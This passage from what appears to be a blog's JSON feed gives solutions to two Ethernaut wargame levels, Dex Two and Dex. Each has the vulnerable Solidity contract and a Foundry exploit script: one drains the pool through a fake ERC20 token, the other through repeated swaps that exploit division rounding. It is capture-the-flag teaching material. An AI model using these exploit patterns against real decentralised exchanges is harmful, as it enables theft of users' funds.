class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token2 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token3 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token1 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token2 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token3 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>We deploy a malicious token (<code class=\"language-plaintext highlighter-rouge\">token3</code>) and swap it for <code class=\"language-plaintext highlighter-rouge\">token2</code>.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/DexTwo.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/IERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Token3</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span> <span class=\"p\">{</span>    <span class=\"n\">DexTwo</span> <span class=\"k\">public</span> <span class=\"n\">dt_</span> <span class=\"o\">=</span> <span class=\"n\">DexTwo</span><span class=\"p\">(</span><span class=\"mh\">0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c</span><span class=\"p\">);</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"s\">\"Token3\"</span><span class=\"p\">,</span> <span class=\"s\">\"TK3\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">);</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">burn</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">account</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">_burn</span><span class=\"p\">(</span><span class=\"n\">account</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">DexTwoSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">DexTwo</span> <span class=\"k\">public</span> <span class=\"n\">dt_</span> <span class=\"o\">=</span> <span class=\"n\">DexTwo</span><span class=\"p\">(</span><span class=\"mh\">0x0e88F53DdCBCCF6375A81100d0Bec91876FC8e3c</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">Token3</span> <span class=\"n\">token3</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Token3</span><span class=\"p\">();</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">),</span> <span class=\"mi\">2</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>        <span class=\"n\">token3</span><span class=\"p\">.</span><span class=\"n\">burn</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>        <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">),</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">1</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token1 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token2 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token3 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token1 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token2 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">)));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token3 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token3</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dt_</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>We can also achieve the goal by exploiting precision loss through fewer <code class=\"language-plaintext highlighter-rouge\">swap</code>.</p>",
            "url": "https://0o3q.github.io/2026/01/07/dex-two",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","dex","precision_loss"],
            
            "date_published": "2026-01-07T00:00:00+09:00",
            "date_modified": "2026-01-07T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2026/01/06/dex",
            "title": "[Ethernaut] 22.Dex",
            "summary": null,
            "content_text": "AnalysisThe goal is “drain all of at least 1 of the 2 tokens from the contract”.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\";import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\";import \"openzeppelin-contracts-08/access/Ownable.sol\";contract Dex is Ownable {    address public token1;    address public token2;    constructor() {}    function setTokens(address _token1, address _token2) public onlyOwner {        token1 = _token1;        token2 = _token2;    }    function addLiquidity(address token_address, uint256 amount) public onlyOwner {        IERC20(token_address).transferFrom(msg.sender, address(this), amount);    }    function swap(address from, address to, uint256 amount) public {        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), \"Invalid tokens\");        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");        uint256 swapAmount = getSwapPrice(from, to, amount);        IERC20(from).transferFrom(msg.sender, address(this), amount);        IERC20(to).approve(address(this), swapAmount);        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);    }    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));    }    function approve(address spender, uint256 amount) public {        SwappableToken(token1).approve(msg.sender, spender, amount);        SwappableToken(token2).approve(msg.sender, spender, amount);    }    function balanceOf(address token, address account) public view returns (uint256) {        return IERC20(token).balanceOf(account);    }}contract SwappableToken is ERC20 {    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)        ERC20(name, symbol)    {        _mint(msg.sender, initialSupply);        _dex = dexInstance;    }    function approve(address owner, address spender, uint256 amount) public {        require(owner != _dex, \"InvalidApprover\");        super._approve(owner, spender, amount);    }}We can swap between token1 and token2 using the swap() function.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Dex.sol\";import \"forge-std/Script.sol\";contract DexSol is Script {    Dex public dex_ = Dex(0x072eb732b94c69AA9Bf16e2655DC154e56c4f5ae);    function run() external {        vm.startBroadcast();        dex_.approve(address(dex_), 100);        dex_.swap(dex_.token1(), dex_.token2(), 10);        dex_.swap(dex_.token2(), dex_.token1(), 20);        dex_.swap(dex_.token1(), dex_.token2(), 24);        dex_.swap(dex_.token2(), dex_.token1(), 30);        dex_.swap(dex_.token1(), dex_.token2(), 41);        dex_.swap(dex_.token2(), dex_.token1(), 45);        console.log(\"My token1 balance:\", dex_.balanceOf(dex_.token1(), msg.sender));        console.log(\"My token2 balance:\", dex_.balanceOf(dex_.token2(), msg.sender));        console.log(\"Dex's token1 balance:\", dex_.balanceOf(dex_.token1(), address(dex_)));        console.log(\"Dex's token2 balance:\", dex_.balanceOf(dex_.token2(), address(dex_)));        vm.stopBroadcast();    }}When swapping, the from token is transferred based on the input amount, whereas the to token is transferred based on the calculated swapAmount.Since swapAmount is derived from getSwapPrice() using division, precision loss may occur.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is “drain all of at least 1 of the 2 tokens from the contract”.</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/IERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"openzeppelin-contracts-08/access/Ownable.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Dex</span> <span class=\"k\">is</span> <span class=\"n\">Ownable</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">token1</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">token2</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{}</span>    <span class=\"k\">function</span> <span class=\"n\">setTokens</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_token1</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_token2</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">token1</span> <span class=\"o\">=</span> <span class=\"n\">_token1</span><span class=\"p\">;</span>        <span class=\"n\">token2</span> <span class=\"o\">=</span> <span class=\"n\">_token2</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">addLiquidity</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">token_address</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token_address</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">((</span><span class=\"n\">from</span> <span class=\"o\">==</span> <span class=\"n\">token1</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">to</span> <span class=\"o\">==</span> <span class=\"n\">token2</span><span class=\"p\">)</span> <span class=\"o\">||</span> <span class=\"p\">(</span><span class=\"n\">from</span> <span class=\"o\">==</span> <span class=\"n\">token2</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">to</span> <span class=\"o\">==</span> <span class=\"n\">token1</span><span class=\"p\">),</span> <span class=\"s\">\"Invalid tokens\"</span><span class=\"p\">);</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"o\">&gt;=</span> <span class=\"n\">amount</span><span class=\"p\">,</span> <span class=\"s\">\"Not enough to swap\"</span><span class=\"p\">);</span>        <span class=\"kt\">uint256</span> <span class=\"n\">swapAmount</span> <span class=\"o\">=</span> <span class=\"n\">getSwapPrice</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">amount</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">swapAmount</span><span class=\"p\">);</span>        <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">transferFrom</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">swapAmount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getSwapPrice</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">from</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"p\">((</span><span class=\"n\">amount</span> <span class=\"o\">*</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">to</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)))</span> <span class=\"o\">/</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">from</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">)));</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">SwappableToken</span><span class=\"p\">(</span><span class=\"n\">token1</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>        <span class=\"n\">SwappableToken</span><span class=\"p\">(</span><span class=\"n\">token2</span><span class=\"p\">).</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">token</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">account</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">IERC20</span><span class=\"p\">(</span><span class=\"n\">token</span><span class=\"p\">).</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">account</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">SwappableToken</span> <span class=\"k\">is</span> <span class=\"n\">ERC20</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">private</span> <span class=\"n\">_dex</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">dexInstance</span><span class=\"p\">,</span> <span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">symbol</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">initialSupply</span><span class=\"p\">)</span>        <span class=\"n\">ERC20</span><span class=\"p\">(</span><span class=\"n\">name</span><span class=\"p\">,</span> <span class=\"n\">symbol</span><span class=\"p\">)</span>    <span class=\"p\">{</span>        <span class=\"n\">_mint</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">initialSupply</span><span class=\"p\">);</span>        <span class=\"n\">_dex</span> <span class=\"o\">=</span> <span class=\"n\">dexInstance</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">owner</span> <span class=\"o\">!=</span> <span class=\"n\">_dex</span><span class=\"p\">,</span> <span class=\"s\">\"InvalidApprover\"</span><span class=\"p\">);</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"n\">_approve</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"n\">spender</span><span class=\"p\">,</span> <span class=\"n\">amount</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>We can swap between <code class=\"language-plaintext highlighter-rouge\">token1</code> and <code class=\"language-plaintext highlighter-rouge\">token2</code> using the <code class=\"language-plaintext highlighter-rouge\">swap()</code> function.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Dex.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DexSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Dex</span> <span class=\"k\">public</span> <span class=\"n\">dex_</span> <span class=\"o\">=</span> <span class=\"n\">Dex</span><span class=\"p\">(</span><span class=\"mh\">0x072eb732b94c69AA9Bf16e2655DC154e56c4f5ae</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">approve</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">),</span> <span class=\"mi\">100</span><span class=\"p\">);</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">10</span><span class=\"p\">);</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">20</span><span class=\"p\">);</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">24</span><span class=\"p\">);</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">30</span><span class=\"p\">);</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"mi\">41</span><span class=\"p\">);</span>        <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"mi\">45</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token1 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My token2 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token2</span><span class=\"p\">(),</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Dex's token1 balance:\"</span><span class=\"p\">,</span> <span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">dex_</span><span class=\"p\">.</span><span class=\"n\">token1</span><span class=\"p\">(),</span> <span 